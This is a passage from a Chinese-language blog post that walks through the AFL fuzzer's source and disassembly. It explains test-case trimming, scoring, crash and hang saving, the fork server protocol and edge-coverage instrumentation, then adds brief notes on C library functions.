q-&gt;len</code>,即每次前进remove_len个步长，直到整个文件都被遍历完为止。<ul><li>由in_buf中remove_pos处开始，向后跳过remove_len个字节，写入到<code>.cur_input</code>里，然后运行一次<code>fault = run_target</code>，trim_execs计数器加一</li><li>由所得trace_bits计算出一个cksum，和<code>q-&gt;exec_cksum</code>比较<ul><li>如果相等<ul><li>从<code>q-&gt;len</code>中减去remove_len个字节，并由此重新计算出一个<code>len_p2</code>，这里注意一下<code>while (remove_len &gt;= MAX(len_p2 / TRIM_END_STEPS, TRIM_MIN_BYTES))</code></li><li>将<code>in_buf+remove_pos+remove_len</code>到最后的字节，前移到<code>in_buf+remove_pos</code>处，等于删除了remove_pos向后的remove_len个字节。</li><li>如果needs_write为0，则设置其为1，并保存当前trace_bits到clean_trace中。</li></ul></li><li>如果不相等<ul><li>remove_pos加上remove_len，即前移remove_len个字节。<strong>注意，如果相等，就无需前移</strong></li></ul></li></ul></li><li>注意trim过程可能比较慢，所以每执行stats_update_freq次，就刷新一次显示界面<code>show_stats</code></li><li>stage_cur加一</li></ul></li></ul></li><li>如果needs_write为1<ul><li>删除原来的q-&gt;fname，创建一个新的q-&gt;fname，将in_buf里的内容写入，然后用clean_trace恢复trace_bits的值。</li><li>进行一次update_bitmap_score</li></ul></li><li>返回fault</li></ul><h4 id="u32-calculate-score-struct-queue-entry-q"><a href="#u32-calculate-score-struct-queue-entry-q" class="headerlink" title="u32 calculate_score(struct queue_entry *q)"></a>u32 calculate_score(struct queue_entry *q)</h4><p>根据queue entry的执行速度、覆盖到的path数和路径深度来评估出一个得分，这个得分perf_score在后面havoc的时候使用。<br>前面的没什么好说的，这里的<code>q-&gt;depth</code>解释一下，它在每次add_to_queue的时候，会设置为<code>cur_depth+1</code>，而cur_depth是一个全局变量，一开始的初始值为0。</p><ul><li>处理输入时<ul><li>在read_testcases的时候会调用add_to_queue，此时所有的input case的queue depth都会被设置为1。</li></ul></li><li>fuzz_one时<ul><li>然后在后面fuzz_one的时候，会先设置cur_depth为当前queue的depth，然后这个queue经过mutate之后调用save_if_interesting,如果是interesting case，就会被add_to_queue，此时就建立起了queue之间的关联关系，所以由当前queue变异加入的新queue，深度都在当前queue的基础上再增加。</li></ul></li></ul><h4 id="u8-common-fuzz-stuff-char-argv-u8-out-buf-u32-len"><a href="#u8-common-fuzz-stuff-char-argv-u8-out-buf-u32-len" class="headerlink" title="u8 common_fuzz_stuff(char **argv, u8 *out_buf, u32 len)"></a>u8 common_fuzz_stuff(char **argv, u8 *out_buf, u32 len)</h4><p>简单的说就是写入文件并执行，然后处理结果，如果出现错误，就返回1.</p><ul><li>如果定义了<code>post_handler</code>,就通过<code>out_buf = post_handler(out_buf, &amp;len)</code>处理一下out_buf，如果out_buf或者len有一个为0，则直接返回0<ul><li><strong>这里其实很有价值，尤其是如果需要对变异完的queue，做一层wrapper再写入的时候。</strong></li></ul></li><li>write_to_testcase(out_buf, len)</li><li>fault = run_target(argv, exec_tmout)</li><li>如果fault是FAULT_TMOUT<ul><li>如果<code>subseq_tmouts++ &gt; TMOUT_LIMIT</code>（默认250），就将cur_skipped_paths加一，直接返回1</li><li>subseq_tmout是连续超时数</li></ul></li><li>否则设置subseq_tmouts为0</li><li>如果skip_requested为1<ul><li>设置skip_requested为0，然后将cur_skipped_paths加一，直接返回1</li></ul></li><li>queued_discovered += save_if_interesting(argv, out_buf, len, fault)，即如果发现了新的路径才会加一。</li><li>如果stage_cur除以stats_update_freq余数是0，或者其加一等于stage_max，就更新展示界面<code>show_stats</code></li><li>返回0</li></ul><h4 id="void-write-to-testcase-void-mem-u32-len"><a href="#void-write-to-testcase-void-mem-u32-len" class="headerlink" title="void write_to_testcase(void *mem, u32 len)"></a>void write_to_testcase(void *mem, u32 len)</h4><p>将从<code>mem</code>中读取<code>len</code>个字节，写入到<code>.cur_input</code>中</p><h4 id="u8-save-if-interesting-char-argv-void-mem-u32-len-u8-fault"><a href="#u8-save-if-interesting-char-argv-void-mem-u32-len-u8-fault" class="headerlink" title="u8 save_if_interesting(char **argv, void *mem, u32 len, u8 fault)"></a>u8 save_if_interesting(char **argv, void *mem, u32 len, u8 fault)</h4><p>检查这个case的执行结果是否是interesting的，决定是否保存或跳过。如果保存了这个case，则返回1，否则返回0<br>以下分析不包括crash_mode，暂时略过以简洁</p><ul><li>设置keeping等于0</li><li><code>hnb = has_new_bits(virgin_bits)</code>，如果没有新的path发现或者path命中次数相同，就直接返回0</li><li>否则，将case保存到<code>fn = alloc_printf(&quot;%s/queue/id:%06u,%s&quot;, out_dir, queued_paths, describe_op(hnb))</code>文件里</li><li><code>add_to_queue(fn, len, 0);</code>将其添加到队列里</li><li>如果hnb的值是2，代表发现了新path，设置刚刚加入到队列里的queue的has_new_cov字段为1，即<code>queue_top-&gt;has_new_cov = 1</code>，然后queued_with_cov计数器加一</li><li>保存hash到其exec_cksum</li><li>评估这个queue，<code>calibrate_case(argv, queue_top, mem, queue_cycle - 1, 0)</code></li><li>设置keeping值为1.</li><li>根据fault结果进入不同的分支<ul><li>FAULT_TMOUT<ul><li>设置total_tmouts计数器加一</li><li>如果unique_hangs的个数超过能保存的最大数量<code>KEEP_UNIQUE_HANG</code>，就直接返回keeping的值</li><li>如果不是dumb mode，就<code>simplify_trace((u64 *) trace_bits)</code>进行规整。</li><li>如果没有发现新的超时路径，就直接返回keeping</li><li>否则，代表发现了新的超时路径，unique_tmouts计数器加一</li><li>如果hang_tmout大于exec_tmout，则以hang_tmout为timeout，重新执行一次runt_target<ul><li>如果结果为<code>FAULT_CRASH</code>，就跳转到keep_as_crash</li><li>如果结果不是<code>FAULT_TMOUT</code>，就返回keeping，否则就使<code>unique_hangs</code>计数器加一，然后更新last_hang_time的值，并保存到<code>alloc_printf(&quot;%s/hangs/id:%06llu,%s&quot;, out_dir, unique_hangs, describe_op(0))</code>文件。</li></ul></li></ul></li><li>FAULT_CRASH<ul><li>total_crashes计数器加一</li><li>如果unique_crashes大于能保存的最大数量<code>KEEP_UNIQUE_CRASH</code>即5000，就直接返回keeping的值</li><li>同理，如果不是dumb mode，就<code>simplify_trace((u64 *) trace_bits)</code>进行规整</li><li>如果没有发现新的crash路径，就直接返回keeping</li><li>否则，代表发现了新的crash路径，unique_crashes计数器加一，并将结果保存到<code>alloc_printf(&quot;%s/crashes/id:%06llu,sig:%02u,%s&quot;, out_dir,unique_crashes, kill_signal, describe_op(0))</code>文件。</li><li>更新last_crash_time和last_crash_execs</li></ul></li><li>FAULT_ERROR<ul><li>抛出异常</li></ul></li><li>对于其他情况，直接返回keeping</li></ul></li></ul><h4 id="simplify-trace-u64-mem"><a href="#simplify-trace-u64-mem" class="headerlink" title="simplify_trace(u64 *mem)"></a>simplify_trace(u64 *mem)</h4><ul><li>按8个字节为一组循环读入，直到完全读取完mem<ul><li>如果mem不为空<ul><li>i从0-7，<code>mem8[i] = simplify_lookup[mem8[i]]</code>，代表规整该路径的命中次数到指令值，这个路径如果没有命中，就设置为1，如果命中了，就设置为128，即二进制的<code>1000 0000</code></li></ul></li><li>否则设置mem为<code>0x0101010101010101ULL</code>，即代表这8个字节代表的path都没有命中，每个字节的值被置为1。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 simplify_lookup[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">        [<span class="number">0</span>]         = <span class="number">1</span>,</span><br><span class="line">        [<span class="number">1</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="通信和覆盖率信息的记录"><a href="#通信和覆盖率信息的记录" class="headerlink" title="通信和覆盖率信息的记录"></a>通信和覆盖率信息的记录</h2><h3 id="关键变量和常量"><a href="#关键变量和常量" class="headerlink" title="关键变量和常量"></a>关键变量和常量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.bss:000000000060208F unk_60208F      db    ? ;               ; DATA XREF: deregister_tm_clones↑o</span><br><span class="line">.bss:0000000000602090 __afl_area_ptr  dq ?                    ; DATA XREF: __afl_maybe_log+4↑r</span><br><span class="line">.bss:0000000000602090                                         ; __afl_maybe_log+48↑w ...</span><br><span class="line">.bss:0000000000602098 __afl_prev_loc  dq ?                    ; DATA XREF: __afl_maybe_log:__afl_store↑r</span><br><span class="line">.bss:0000000000602098                                         ; __afl_maybe_log+17↑w ...</span><br><span class="line">.bss:00000000006020A0 ; __pid_t _afl_fork_pid</span><br><span class="line">.bss:00000000006020A0 __afl_fork_pid  dd ?                    ; DATA XREF: __afl_maybe_log+1C6↑w</span><br><span class="line">.bss:00000000006020A0                                         ; __afl_maybe_log+1D3↑o ...</span><br><span class="line">.bss:00000000006020A4 ; int _afl_temp</span><br><span class="line">.bss:00000000006020A4 __afl_temp      dd ?                    ; DATA XREF: __afl_maybe_log+174↑o</span><br><span class="line">.bss:00000000006020A4                                         ; __afl_maybe_log+198↑o ...</span><br><span class="line">.bss:00000000006020A8 __afl_setup_failure db ?                ; DATA XREF: __afl_maybe_log:__afl_setup↑r</span><br><span class="line">.bss:00000000006020A8                                         ; __afl_maybe_log:__afl_setup_abort↑w</span><br><span class="line">...</span><br><span class="line">.text:0000000000400DEF ; char AFL_SHM_ENV[]</span><br><span class="line">.text:0000000000400DEF _AFL_SHM_ENV    db &#39;__AFL_SHM_ID&#39;,0     ; DATA XREF: __afl_maybe_log+11F↑o</span><br><span class="line">.text:0000000000400DEF                                         ; Alternative name is &#39;.AFL_VARS&#39;</span><br></pre></td></tr></table></figure><ul><li>__afl_area_ptr<ul><li>存储共享内存的首地址</li></ul></li><li>__afl_prev_loc<ul><li>存储上一个位置，即上一次R(MAP_SIZE)生成的随机数的值</li></ul></li><li>__afl_fork_pid<ul><li>存储fork出来的子进程的pid</li></ul></li><li>__afl_temp<ul><li>临时buffer</li></ul></li><li>_AFL_SHM_ENV<ul><li>申请的共享内存的shm_id被设置为环境变量<code>__AFL_SHM_ID</code>的值，所以通过这个环境变量来获取shm_id，然后进一步得到共享内存。</li></ul></li></ul><h3 id="trampoline-fmt-64"><a href="#trampoline-fmt-64" class="headerlink" title="trampoline_fmt_64"></a>trampoline_fmt_64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009C0                 lea     rsp, [rsp-98h]</span><br><span class="line">.text:00000000004009C8                 mov     [rsp+98h+var_98], rdx</span><br><span class="line">.text:00000000004009CC                 mov     [rsp+98h+var_90], rcx</span><br><span class="line">.text:00000000004009D1                 mov     [rsp+98h+var_88], rax</span><br><span class="line">.text:00000000004009D6                 mov     rcx, 2359h----&gt;R(MAP_SIZE)</span><br><span class="line">.text:00000000004009DD                 call    __afl_maybe_log</span><br><span class="line">.text:00000000004009E2                 mov     rax, [rsp+98h+var_88]</span><br><span class="line">.text:00000000004009E7                 mov     rcx, [rsp+98h+var_90]</span><br><span class="line">.text:00000000004009EC                 mov     rdx, [rsp+98h+var_98]</span><br><span class="line">.text:00000000004009F0                 lea     rsp, [rsp+98h]</span><br></pre></td></tr></table></figure><p>插入的trampoline_fmt_64只有在<code>mov rcx, xxx</code>这里不同，其xxx的取值就是随机数R(MAP_SIZE),以此来标识与区分每个分支点，然后传入<code>__afl_maybe_log</code>作为第二个参数调用这个函数。</p><h3 id="afl-maybe-log"><a href="#afl-maybe-log" class="headerlink" title="__afl_maybe_log"></a>__afl_maybe_log</h3><p>直接看汇编，还是很好理解的</p><ul><li>首先检查<code>_afl_area_ptr</code>是否为0，即是否共享内存已经被设置了。<strong>换句话说，只有第一个__afl_maybe_log会执行这个if里的代码</strong><ul><li>如果<code>_afl_area_ptr</code>为0，即共享内存还没被设置，则判断<code>_afl_setup_failure</code>是否为真，如果为真，则代表setup失败，直接返回。<ul><li>读取<code>_afl_global_area_ptr</code>的值<ul><li>如果不为0，则赋值给<code>_afl_area_ptr</code></li><li>否则<ul><li>首先读取环境变量<code>__AFL_SHM_ID</code>，默认是个字符串，atoi转一下，得到shm_id，然后通过shmat启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间，将得到的地址，保存到<code>_afl_area_ptr</code>和<code>_afl_global_area_ptr</code>中。</li><li>然后通过<code>FORKSRV_FD+1</code>即199这个文件描述符，向状态管道中写入4个字节的值，用来告知afl fuzz，fork server成功启动，等待下一步指示。</li><li>进入<code>__afl_fork_wait_loop</code>循环，从<code>FORKSRV</code>即198中读取字节到<code>_afl_temp</code>，直到读取到4个字节，这代表afl fuzz命令我们新建进程执行一次测试。<ul><li>fork出子进程，原来的父进程充当fork server来和fuzz进行通信，而子进程则继续执行target。</li><li>父进程即fork server将子进程的pid写入到状态管道，告知fuzz。</li><li>然后父进程即fork server等待子进程结束，并保存其执行结果到<code>_afl_temp</code>中，然后将子进程的执行结果，从<code>_afl_temp</code>写入到状态管道，告知fuzz。</li><li>父进程不断轮询<code>__afl_fork_wait_loop</code>循环，不断从控制管道读取，直到fuzz端命令fork server进行新一轮测试。</li></ul></li></ul></li></ul></li></ul></li></ul></li><li>如果<code>_afl_area_ptr</code>不为0，即共享内存已经被设置好了。那么就跳过上面的if，只执行<code>__afl_store</code>逻辑，伪代码如下:<ul><li>简单的说，就是将上一个桩点的值(prev_location)和当前桩点的值(<code>R(MAP_SIZE)</code>)异或，取值后，使得<strong>共享内存里对应的槽</strong>的值加一，然后将prev_location设置为<code>cur_location &gt;&gt; 1;</code></li><li>因此，AFL为每个代码块生成一个随机数，作为其“位置”的记录；随后，对分支处的”源位置“和”目标位置“进行异或，并将异或的结果作为该分支的key，保存每个分支的执行次数。用于保存执行次数的实际上是一个哈希表，大小为MAP_SIZE=64K，当然会存在碰撞的问题；但根据AFL文档中的介绍，对于不是很复杂的目标，碰撞概率还是可以接受的。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li><li>另外，比较有意思的是，AFL需要将cur_location右移1位后，再保存到prev_location中。官方文档中解释了这样做的原因。假设target中存在A-&gt;A和B-&gt;B这样两个跳转，如果不右移，那么这两个分支对应的异或后的key都是0，从而无法区分；另一个例子是A-&gt;B和B-&gt;A，如果不右移，这两个分支对应的异或后的key也是相同的。</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __usercall _afl_maybe_log@&lt;al&gt;(<span class="keyword">char</span> a1@&lt;of&gt;, __int64 a2@&lt;rcx&gt;, __int64 a3@&lt;xmm0&gt;, __int64 a4@&lt;xmm1&gt;, __int64 a5@&lt;xmm2&gt;, __int64 a6@&lt;xmm3&gt;, __int64 a7@&lt;xmm4&gt;, __int64 a8@&lt;xmm5&gt;, __int64 a9@&lt;xmm6&gt;, __int64 a10@&lt;xmm7&gt;, __int64 a11@&lt;xmm8&gt;, __int64 a12@&lt;xmm9&gt;, __int64 a13@&lt;xmm10&gt;, __int64 a14@&lt;xmm11&gt;, __int64 a15@&lt;xmm12&gt;, __int64 a16@&lt;xmm13&gt;, __int64 a17@&lt;xmm14&gt;, __int64 a18@&lt;xmm15&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  v19 = _afl_area_ptr;</span><br><span class="line">  <span class="keyword">if</span> ( !_afl_area_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_setup_failure )</span><br><span class="line">      <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">    v19 = _afl_global_area_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_global_area_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      _afl_area_ptr = _afl_global_area_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      v22 = getenv(<span class="string">"__AFL_SHM_ID"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v22 || (v23 = atoi(v22), v24 = shmat(v23, <span class="number">0L</span>L, <span class="number">0</span>), v24 == (<span class="keyword">void</span> *)<span class="number">-1L</span>L) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++_afl_setup_failure;</span><br><span class="line">        v18 = v29;</span><br><span class="line">        <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      _afl_area_ptr = (__int64)v24;</span><br><span class="line">      _afl_global_area_ptr = v24;</span><br><span class="line">      v28 = (__int64)v24;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4u</span>LL) == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = <span class="number">198</span>;</span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">read</span>(<span class="number">198</span>, &amp;_afl_temp, <span class="number">4u</span>LL) != <span class="number">4</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          LODWORD(v26) = fork();</span><br><span class="line">          <span class="keyword">if</span> ( v26 &lt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v26 )</span><br><span class="line">            <span class="keyword">goto</span> __afl_fork_resume;</span><br><span class="line">          _afl_fork_pid = v26;</span><br><span class="line">          <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_fork_pid, <span class="number">4u</span>LL);</span><br><span class="line">          v25 = _afl_fork_pid;</span><br><span class="line">          LODWORD(v27) = waitpid(_afl_fork_pid, &amp;_afl_temp, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v27 &lt;= <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4u</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        _exit(v25);</span><br><span class="line">      &#125;</span><br><span class="line">__afl_fork_resume:</span><br><span class="line">      <span class="built_in">close</span>(<span class="number">198</span>);</span><br><span class="line">      <span class="built_in">close</span>(<span class="number">199</span>);</span><br><span class="line">      v19 = v28;</span><br><span class="line">      v18 = v29;</span><br><span class="line">      a2 = v30;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v20 = _afl_prev_loc ^ a2;</span><br><span class="line">  _afl_prev_loc ^= v20;</span><br><span class="line">  _afl_prev_loc = (<span class="keyword">unsigned</span> __int64)_afl_prev_loc &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  ++*(_BYTE *)(v19 + v20);</span><br><span class="line">  <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><p>strrchr</p><ul><li><code>char *strrchr(const char *str, int c)</code> 在参数 str 所指向的字符串中搜索最后一次出现字符 c（一个无符号字符）的位置。</li></ul></li><li><p>strlen</p><ul><li><code>unsigned int strlen (char *s)</code> 用来计算指定的字符串s的长度，不包括结束字符”\0”。</li><li>注意：strlen() 函数计算的是字符串的实际长度，遇到第一个’\0’结束。如果你只定义没有给它赋初值，这个结果是不定的，它会从首地址一直找下去，直到遇到’\0’停止。而sizeof返回的是变量声明后所占的内存数，不是实际长度，此外sizeof不是函数，仅仅是一个操作符，strlen()是函数。</li></ul></li><li><p>DFL_ck_strdup</p><ul><li>Create a buffer with a copy of a string. Returns NULL for NULL inputs.</li><li><code>size = strlen((char*)str) + 1;</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ALLOC_MAGIC_C1-&gt; 00 ff 00 ff   size-&gt; 2e 00 00 00   ret-&gt; 2f 55 73 65   72 73 2f 73   │ ····.···&#x2F;Users&#x2F;s │</span><br><span class="line">61 6b 75 72   61 2f 67 69   74 73 6f 75   72 63 65 2f   │ akura&#x2F;gitsource&#x2F; │</span><br><span class="line">41 46 4c 2f   63 6d 61 6b   65 2d 62 75   69 6c 64 2d   │ AFL&#x2F;cmake-build- │</span><br><span class="line">64 65 62 75   67 00 ALLOC_MAGIC_C2-&gt; f0 00   00 00 00 00   00 00 00 00   │ debug··········· │</span><br></pre></td></tr></table></figure></li></ul></li><li><p>snprintf()</p><ul><li><code>int snprintf(char *str, int n, char * format [, argument, ...]);</code>函数用于将格式化的数据写入字符串</li><li>str为要写入的字符串；n为要写入的字符的最大数目，超过n会被截断；format为格式化字符串，与printf()函数相同；argument为变量。</li><li><a href="http://brg-liuwei.github.io/tech/2014/09/29/snprintf.html" target="_blank" rel="noopener">http://brg-liuwei.github.io/tech/2014/09/29/snprintf.html</a><ul><li>重点理解snprintf函数的返回值，不是实际打印出来的长度，而是实际应该打印的长度。</li></ul></li><li><a href="https://forcemz.net/cxx/2019/04/29/StringFormattingTalk/" target="_blank" rel="noopener">https://forcemz.net/cxx/2019/04/29/StringFormattingTalk/</a><ul><li>snprintf的可能的一种实现，及其可能存在的安全问题。</li></ul></li></ul></li><li><p>DFL_ck_alloc</p><ul><li>Allocate a buffer, returning zeroed memory.<ul><li>DFL_ck_alloc_nozero<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 ff 00 ff   35 00 00 00   00 00 00 00   00 00 00 00   │ ····5··········· │</span><br><span class="line">00 00 00 00   00 00 00 00   00 00 00 00   00 00 00 00   │ ················ │</span><br><span class="line">00 00 00 00   00 00 00 00   00 00 00 00   00 00 00 00   │ ················ │</span><br><span class="line">00 00 00 00   00 00 00 00   00 00 00 00   00 f0 00 00   │ ················ │</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>alloc_printf</p><ul><li>User-facing macro to sprintf() to a dynamically allocated buffer<ul><li>ck_alloc:分配内存</li><li>snprintf:写入格式化字符串<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 ff 00 ff   35 00 00 00   2f 55 73 65   72 73 2f 73   │ ····5···&#x2F;Users&#x2F;s │</span><br><span class="line">61 6b 75 72   61 2f 67 69   74 73 6f 75   72 63 65 2f   │ akura&#x2F;gitsource&#x2F; │</span><br><span class="line">41 46 4c 2f   63 6d 61 6b   65 2d 62 75   69 6c 64 2d   │ AFL&#x2F;cmake-build- │</span><br><span class="line">64 65 62 75   67 2f 61 66   6c 2d 61 73   00 f0 00 00   │ debug&#x2F;afl-as···· │</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>access</p><ul><li><code>int access(const char * pathname, int mode)</code> 检查调用进程是否可以对指定的文件执行某种操作。</li><li>成功执行时，返回0。失败返回-1，errno被设为以下的某个值</li></ul></li><li><p>strncmp</p></li><li><p><code>int strncmp ( const char * str1, const char * str2, size_t n );</code>若str1与str2的前n个字符相同，则返回0；若s1大于s2，则返回大于0的值；若s1 若小于s2，则返回小于0的值。</p></li><li><p>strcmp</p></li><li><p><code>int strcmp(const char *s1, const char *s2);</code>若参数s1 和s2 字符串相同则返回0。s1 若大于s2 则返回大于0 的值。s1 若小于s2 则返回小于0 的值。</p></li><li><p>strstr</p><ul><li><code>char *strstr(const char *haystack, const char *needle)</code>在字符串 haystack 中查找第一次出现字符串 needle 的位置，不包含终止符 ‘\0’。</li><li>返回该函数返回在 haystack 中第一次出现 needle 字符串的位置，如果未找到则返回 null。</li></ul></li><li><p>gettimeofday</p><ul><li><code>int gettimeofday(struct timeval *tv, struct timezone *tz)</code>gettimeofday()会把目前的时间用tv结构体返回，当地时区的信息则放到tz所指的结构中。</li><li>timeval<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_STRUCT_TIMEVAL</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">__darwin_time_t</span>         tv_sec;         <span class="comment">/* seconds */</span></span><br><span class="line">    <span class="keyword">__darwin_suseconds_t</span>    tv_usec;        <span class="comment">/* and microseconds */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>srandom</p><ul><li>设置随机种子，注意只需要设置一次即可</li><li>1、生产随机数需要种子（Seed），且如果种子固定，random()每次运行生成的随机数（其实是伪随机数）也是固定的；因为返回的随机数是根据稳定的算法得出的稳定结果序列，并且Seed就是这个算法开始计算的第一个值。</li><li>2、srandom()可以设定种子，比如srandom(0) 、srandom(1)等等。如果srandom设定了一个固定的种子，那么random得出的随机数就是固定的；<br>如果程序运行时通过srandom(time(NULL))设定种子为随机的，那么random()每次生成的随机数就是非固定的了。</li></ul></li><li><p>open</p><ul><li><a href="http://c.biancheng.net/cpp/html/238.html" target="_blank" rel="noopener">open函数的简要介绍</a></li><li><a href="https://blog.csdn.net/csdn66_2016/article/details/77716008" target="_blank" rel="noopener">open函数返回值</a></li><li>调用成功时返回一个文件描述符fd，调用失败时返回-1，并修改errno</li></ul></li><li><p>fdopen</p><ul><li><code>FILE * fdopen(int fildes, const char * mode);</code>fdopen()会将参数fildes 的文件描述词, 转换为对应的文件指针后返回.</li><li>参数mode 字符串则代表着文件指针的流形态, 此形态必须和原先文件描述词读写模式相同. 关于mode字符串格式请参考fopen().</li><li>返回值：转换成功时返回指向该流的文件指针. 失败则返回NULL, 并把错误代码存在errno中.</li></ul></li><li><p>fgets</p><ul><li><code>char *fgets(char *str, int size, FILE *stream)</code>从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 (size-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</li><li>string为一个字符数组，用来保存读取到的字符。</li><li>size为要读取的字符的个数。如果该行字符数大于size-1，则读到size-1个字符时结束，并在最后补充’\0’；如果该行字符数小于等于size-1，则读取所有字符，并在最后补充’\0’。即，每次最多读取size-1个字符。</li><li>stream为文件流指针。</li><li>【返回值】读取成功，返回读取到的字符串，即string；失败或读到文件结尾返回NULL。因此我们不能直接通过fgets()的返回值来判断函数是否是出错而终止的，应该借助feof()函数或者ferror()函数来判断。</li></ul></li><li><p>fopen</p><ul><li><code>FILE * fopen(const char * path, const char * mode);</code>打开一个文件并返回文件指针</li><li><a href="http://c.biancheng.net/cpp/html/250.html" target="_blank" rel="noopener">fopen参数详解</a></li></ul></li><li><p>atexit</p><ul><li><code>int atexit (void (*function) (void));</code>atexit()用来设置一个程序正常结束前调用的函数. 当程序通过调用exit()或从main中返回时, 参数function所指定的函数会先被调用, 然后才真正由exit()结束程序.</li><li>如果执行成功则返回0, 否则返回-1, 失败原因存于errno 中.</li></ul></li><li><p>mkdir</p><ul><li><code>int mkdir(const char *pathname, mode_t mode);</code>mkdir()函数以mode方式创建一个以pathname为名字的目录，mode定义所创建目录的权限</li><li>返回值: 0:目录创建成功 -1:创建失败</li></ul></li><li><p>flock</p><ul><li><code>int flock(int fd,int 